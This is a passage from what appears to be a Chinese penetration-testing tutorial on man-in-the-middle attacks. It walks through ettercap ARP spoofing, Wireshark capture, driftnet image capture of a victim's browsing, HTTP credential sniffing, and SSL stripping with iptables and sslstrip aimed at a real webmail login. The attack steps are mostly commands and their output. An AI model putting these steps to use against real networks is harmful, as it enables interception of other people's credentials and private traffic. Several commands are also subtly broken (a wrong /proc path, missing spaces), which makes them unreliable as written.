    # Wireshark，一种通用数据包捕获工具


    Wireshark 是一种用于网络数据包的工具，可用于捕获和分析数据包。在用户实施中间人攻击后，可以使用 Wireshark 监控流经网络的目标主机数据包。本节将介绍如何使用
    Wireshark 工具捕获数据包。


    ## 使用 Wireshark 监控目标主机的数据包。


    具体步骤如下：


    1) 实施中间人攻击。


    执行命令如下：


    ```bash

    root@exampleserver:～# ettercap -Tq -M arp:remote /192.168.29.148// /192.168.29.2//

    ```


    2) 启动 Wireshark 工具。在菜单栏中，依次选择 `Applications```|``sniffing/spoofing``|`wireshark`
    命令，界面将会显示。


    3) 在此界面中选择监听接口 `eth0`。然后，点击开始捕获组按钮开始捕获数据包。


    4) 此时，所有通过接口 `eth0` 的数据包都在被监控。当捕获到足够的数据包时，点击停止捕获组按钮停止捕获数据包。


    5) 将捕获的包保存为捕获文件。在菜单栏中选择 `File` `|` `Save` 命令，界面将会显示。


    6) 在此界面中指定捕获文件名称和位置。然后，点击 `Save` 按钮成功保存捕获的数据包。


    # 捕获图片


    在用户成功实施中间人攻击后，可以使用 driftnet 工具捕获图片。Driftnet 是一种简单实用的图像捕获工具，可以轻松捕获网络数据包中的图像。通过与
    `ettercap` 工具配合，你可以捕获目标主机浏览的所有图片。本节将介绍如何使用 driftnet 工具捕获目标机的图片。


    driftnet 工具的语法格式如下：


    ```bash

    driftnet [options]

    ```


    ## 使用 driftnet 工具捕获目标主机浏览的所有图片。


    具体步骤如下：


    1) 使用 Ettercap 实施中间人攻击。


    执行命令如下：


    ```bash

    root@exampleserver:～# ettercap -Tq -M arp:remote /192.168.29.135// /192.168.29.2//

    ```


    看到上述输出信息表示已对目标成功实施了 ARP 欺骗。接下来，用户可以使用 driftnet 工具监控目标主机的图片。


    2) 使用 driftnet 开始监控目标主机浏览的所有图片，并指定将监控的图片临时保存到 `/root/image` 目录。


    执行命令如下：


    ```bash

    root@exampleserver:～# driftnet -i eth0-d /root/image

    ```


    执行上述命令后，会弹出一个 driftnet 终端窗口。


    3) 当捕获到目标主机浏览的图片时，会在窗口中显示。此外，在 driftnet 监控的交互模式下也可以看到图像信息。


    你可以从上方显示的信息中看到捕获的图片信息。在上面的信息输出中，用户还可以发现一些警告信息。这是由于 driftnet 工具不支持某些图像格式导致的。


    此时，用户进入指定的图片目录，你可以在 `/root/image` 目录下看到所有捕获并保存的图像。用户可以使用图片查看器查看任何图片，显示结果所示。


    4) 你可以通过此界面看到捕获的图片。如果用户不想再次捕获图片，按下 `Ctrl+C` 组合键停止监控。


    # 第 25 章


    ## 数据进级监控


    ## 监控 HTTP 数据


    HTTP（超文本传输协议）是一种用于 Web 服务器向本地浏览器传输超文本的传输协议。通常，HTTP 协议被客户端用于访问网页。因此，用户也可以通过中间人攻击监控目标用户访问的
    HTTP 数据。由于 HTTP 协议以明文传输数据，如果用户登录 HTTP 协议网站，用户信息将会被监控。下文将介绍如何使用 Ettercap 工具嗅探 HTTP
    协议数据。


    具体步骤如下：


    1) 使用 Ettercap 工具对目标实施中间人攻击。


    执行命令如下：


    ```bash

    root@exampleserver:～# ettercap -Tq -M arp:remote /192.168.29.135// /192.168.29.2//

    ```


    看到上述输出信息表示 ARP 欺骗攻击已在目标上成功实施。


    2) 此时，当目标主机访问 HTTP 协议网站时，它将由攻击主机监控。


    例如，登录此处 UNIX 论坛，当用户输入登录信息并登录时，将由攻击主机监控。如下所示：


    ```

    HTTP: 42.62.98.167:80->

    USER: testuser PASS: password

    ```


    从输出信息中，我们可以看到目标主机访问 UNIX 论坛的登录信息被监控。用户名是 `testuser`，密码是 `password`。


    ## 监控 HTTPS 数据


    HTTPS（安全超文本传输协议）是 HTTP 的安全版本。此时，用户可以使用 SSLStrip 工具解密加密数据。下文将介绍如何使用 SSLStrip 工具监控
    HTTPS 数据。


    具体步骤如下：


    1) 开启路由转发。


    ```bash

    root@exampleserver:～# echo 1>/proc/sys/ipv4/ip_forward

    ```


    2) 通过 iptables 将所有 HTTP 数据导入端口 10000。


    ```bash

    root@exampleserver:～# iptables -t nat -A PREROUTING -p tcp --destination-port
    80-j REDIRECT --to-port 10000

    ```


    3) 使用 sslstrip 监控端口 10000 以获取信息。


    执行命令如下：


    ```bash

    root@exampleserver:～# sslstrip -a -l 10000

    ```


    从输出信息中可以看到 SSLStrip 工具正在运行。此时，当前目录下会创建一个名为 `sslstrip.log` 的日志文件。


    通过监控日志文件，可以看到目标主机传输的数据：


    ```bash

    root@exampleserver:～# tail -f sslstrip.log

    ```


    提示：在使用 SSLStrip 进行攻击时，可能会出现一些警告信息。这些这并不影响 SSLStrip 对数据包的捕获。


    其中，警告信息显示如下：


    ```

    Unhandled error in Deferred: Traceback (most recent call last):

    ```


    4) 实施 ARP 欺骗攻击。


    执行命令如下：


    ```bash

    root@exampleserver:～# ettercap -Tq -M arp:remote /192.168.29.136// /192.168.29.2//

    ```


    5) 此时，目标主机访问 HTTPS 加密网站。如果目标用户提交敏感信息，将被 SSLStrip 捕获。例如，登录 126 邮箱（`https://mail.126.com`）来验证
    SSLStrip 攻击的成功。当目标用户成功访问 126 邮箱时，界面将会显示。


    6) 从此界面可以看到 126 邮箱的登录界面已成功显示。此外，你从浏览器地址栏可以看到它已被 SSLStrip 工具解密为 HTTP 协议（`http://mail.126.com`）。


